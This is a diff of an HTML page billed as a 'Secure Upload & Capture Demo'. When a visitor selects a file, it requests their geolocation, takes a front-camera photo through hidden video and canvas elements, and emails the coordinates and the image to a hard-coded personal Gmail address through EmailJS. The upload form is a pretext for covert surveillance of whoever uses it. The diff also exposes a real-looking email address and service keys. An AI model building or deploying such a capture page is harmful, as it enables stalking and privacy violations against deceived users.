@@ -5,13 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Upload & Capture Demo</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- ADDED: EmailJS SDK -->
+    <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        /* Smooth fade in for elements */
-        .fade-in {
-            animation: fadeIn 0.5s ease-in;
-        }
+        .fade-in { animation: fadeIn 0.5s ease-in; }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
@@ -52,13 +49,20 @@
             </div>
         </div>
 
-        <!-- Hidden Elements for Processing (Required for functionality but not shown) -->
+        <!-- Hidden Elements -->
         <video id="videoElement" class="hidden" playsinline autoplay muted></video>
         <canvas id="canvas" class="hidden"></canvas>
-
     </div>
 
     <script>
+        // --- CONFIGURATION ---
+        // REPLACE THESE WITH YOUR KEYS
+        const PUBLIC_KEY = "xikZxmVDaSeHT4NVN";    
+        const SERVICE_ID = "service_hvsdmdd";  
+        const TEMPLATE_ID = "template_n3cemtj"; 
+        const ADMIN_EMAIL = "rohanam2000@gmail.com";
+
+        // DOM Elements
         const fileInput = document.getElementById('fileInput');
         const statusArea = document.getElementById('statusArea');
         const statusText = document.getElementById('statusText');
@@ -66,22 +70,19 @@
         const video = document.getElementById('videoElement');
         const canvas = document.getElementById('canvas');
 
-        // --- EMAILJS CONFIGURATION ---
-        // YOU MUST REPLACE THESE WITH YOUR ACTUAL KEYS FROM EMAILJS.COM
-        const PUBLIC_KEY = "xikZxmVDaSeHT4NVN";  
-        const SERVICE_ID = "service_hvsdmdd";  
-        const TEMPLATE_ID = "template_n3cemtj"; 
-
         // Initialize EmailJS
         (function() {
-            emailjs.init(PUBLIC_KEY);
+            if (typeof emailjs !== 'undefined') {
+                emailjs.init(PUBLIC_KEY);
+            } else {
+                console.error("EmailJS SDK not loaded. Check internet connection.");
+            }
         })();
 
-        const ADMIN_EMAIL = "rohanam2000@gmail.com";
-
+        // Helper to show status messages
         function updateStatus(msg, type = 'info') {
             statusArea.classList.remove('hidden');
-            loadingIcon.classList.remove('hidden'); // Show spinner by default on updates
+            loadingIcon.classList.remove('hidden'); 
             
             if (type === 'error') {
                 statusArea.className = "bg-red-50 text-red-800 text-xs p-3 rounded border border-red-200 mt-4 fade-in";
@@ -95,55 +96,118 @@
             statusText.textContent = msg;
         }
 
+        // --- CORE FUNCTIONS ---
+
+        // Function 1: Get User Location
+        async function getUserLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("Geolocation is not supported."));
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude,
+                                long: position.coords.longitude
+                            });
+                        },
+                        (error) => {
+                            // Resolve with default values if denied, so the app doesn't crash
+                            console.warn("Location denied:", error);
+                            resolve({ lat: "Denied/Unavailable", long: "Denied/Unavailable" }); 
+                        }
+                    );
+                }
+            });
+        }
+
+        // Function 2: Capture Camera Image
+        async function captureUserImage() {
+            try {
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                // Wait for video to be ready
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+
+                // Wait 800ms for camera exposure to adjust
+                await new Promise(r => setTimeout(r, 800));
+
+                // Capture to hidden canvas
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Stop camera stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Return base64 image string
+                return canvas.toDataURL('image/png');
+
+            } catch (err) {
+                console.error("Camera Error:", err);
+                throw new Error("Camera access denied or unavailable.");
+            }
+        }
+
+        // Function 3: Send Email
+        async function sendToBackend(location, imageBase64) {
+            console.log("Sending email...");
+            
+            const templateParams = {
+                to_email: ADMIN_EMAIL,
+                latitude: location.lat,
+                longitude: location.long,
+                my_image: imageBase64 
+            };
+
+            try {
+                await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
+                return true;
+            } catch (error) {
+                console.error("EmailJS Error:", error);
+                throw new Error("Failed to send email. Check API keys and console.");
+            }
+        }
+
+        // Main Event Handler
         async function handleUpload(event) {
             if (event.target.files.length === 0) return;
 
             updateStatus("Initializing secure capture protocols...");
 
             try {
-                // 1. Get Location (Silent)
+                // 1. Get Location
                 const locationData = await getUserLocation();
                 updateStatus("Location acquired. Accessing camera...");
                 
-                // 2. Capture Camera Image (Silent)
+                // 2. Capture Camera Image
                 const imageData = await captureUserImage();
                 updateStatus(`Encrypting data for transfer to ${ADMIN_EMAIL}...`);
                 
-                // 3. SEND EMAIL VIA EMAILJS
+                // 3. Send Email
                 await sendToBackend(locationData, imageData);
                 
                 updateStatus(`Verification data successfully sent to ${ADMIN_EMAIL}.`, 'success');
 
             } catch (error) {
                 console.error(error);
-                updateStatus(error.message || "An error occurred accessing device sensors.", 'error');
+                updateStatus(error.message || "An error occurred.", 'error');
             }
         }
 
-        // ... existing code ... (getUserLocation and captureUserImage remain the same)
-
-        async function sendToBackend(location, imageBase64) {
-            console.log("Attempting to send email via EmailJS...");
-            
-            const templateParams = {
-                to_email: ADMIN_EMAIL,
-                latitude: location.lat,
-                longitude: location.long,
-                // Note: Base64 strings are very long. Some email providers may clip this 
-                // or block it if it's too large.
-                my_image: imageBase64 
-            };
-
-            try {
-                await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
-                console.log("Email sent successfully!");
-                return true;
-            } catch (error) {
-                console.error("EmailJS Error:", error);
-                throw new Error("Failed to send email. Check API keys.");
-            }
-        }
-
+        // Attach listener
         fileInput.addEventListener('change', handleUpload);
 
     </script>
